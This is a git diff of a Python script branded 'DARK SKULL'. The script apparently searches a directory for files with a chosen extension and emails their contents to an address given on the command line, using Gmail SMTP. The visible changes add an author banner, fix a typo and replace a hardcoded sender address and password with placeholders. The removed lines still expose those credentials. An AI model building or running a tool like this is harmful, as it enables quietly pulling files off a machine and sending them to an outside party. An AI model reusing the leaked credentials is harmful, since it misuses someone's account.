@@ -13,11 +13,13 @@ def main():
         parser = argparse.ArgumentParser(description='COMMANDS:')
         parser.add_argument('--target', "-t", help="what is the target extension, for example: txt, java, js, html etc")
         parser.add_argument('--mail', "-m", help="who will receive the email")
-        parser.add_argument('--directory', "-d", help="directory for the search, for examplo: ./, ./Downloads, ../")
+        parser.add_argument('--directory', "-d", help="directory for the search, for example: ./, ./Downloads, ../")
         args = parser.parse_args()   
 
         print("Welcome to DARK SKULL")
         time.sleep(1)
+        print("Created by gaidis18")
+        time.sleep(0.5)
         print("")
         print("███████████████████████████")
         time.sleep(0.05)
@@ -91,9 +93,10 @@ def main():
         print("Ready to send the content by e-mail to {}...".format(args.mail))
         time.sleep(1)
 
-        fromaddr = "recmail1818@gmail.com"
+        #mail login
+        fromaddr = "[<MAIL>]"
         toaddr = "{}".format(args.mail)
-        frompass = "gophish321"
+        frompass = "[<PASS>]"
 
         msg = MIMEMultipart()
 
@@ -116,7 +119,8 @@ def main():
         msg.attach(part)
 
         print("Login...")
-        server = smtplib.SMTP('smtp.gmail.com', 587)
+        #smtp
+        server = smtplib.SMTP('<smtp.gmail.com>', 587)
         server.ehlo()
         server.starttls()
         server.login(fromaddr,frompass)
